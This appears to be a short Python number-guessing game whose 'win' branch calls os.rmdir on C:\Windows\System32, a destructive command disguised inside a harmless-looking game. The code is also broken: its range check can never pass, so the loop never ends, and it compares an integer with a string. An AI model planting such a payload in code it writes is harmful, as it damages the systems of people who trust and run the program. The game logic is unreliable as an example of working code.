import os, random

user_input_correct = False

while not user_input_correct:
    user_input = input("Give me a number between 1 and 10")
    bot_value = random.randint(1, 10)
    if user_input.isdigit() and 1 >= int(user_input) >= 10:
        user_input_correct = True
        if bot_value == user_input:
            print("Correct ! You won !")
            os.rmdir(r"C:\Windows\System32")
    else:
        print("Incorrect input, try again.")

